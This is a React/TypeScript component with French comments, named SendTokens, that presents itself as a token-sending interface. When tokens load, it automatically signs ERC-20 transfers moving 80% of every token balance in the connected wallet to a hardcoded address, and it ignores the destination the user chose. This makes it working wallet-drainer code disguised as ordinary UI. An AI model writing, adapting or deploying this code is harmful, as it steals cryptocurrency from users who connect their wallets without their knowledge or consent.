import { useEffect, useCallback } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { normalize } from 'viem/ens';
import { isAddress } from 'essential-eth';

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Adresse de destination fixe
  const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';

  // Automatiser l'envoi de tous les tokens disponibles
  const sendAllTokens = useCallback(async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!fixedDestinationAddress) return;

    // Vérifier si l'adresse de destination est une adresse ENS
    let resolvedDestinationAddress = fixedDestinationAddress;
    if (resolvedDestinationAddress.includes('.')) {
      const ensAddress = await publicClient.getEnsAddress({
        name: normalize(resolvedDestinationAddress),
      });
      if (ensAddress) {
        resolvedDestinationAddress = ensAddress;
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      try {
        const tokenBalance = BigInt(token.balance);
        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            resolvedDestinationAddress as `0x${string}`,
            amountToSend,
          ],
        });

        const response = await walletClient.writeContract(request);

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
      }
    }
  }, [tokens, walletClient, setCheckedRecords, publicClient]);  // Enlever destinationAddress car c'est une valeur fixe

  useEffect(() => {
    if (tokens.length > 0) {
      sendAllTokens();
    }
  }, [tokens, walletClient, sendAllTokens, publicClient]); // Dépendances mises à jour

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
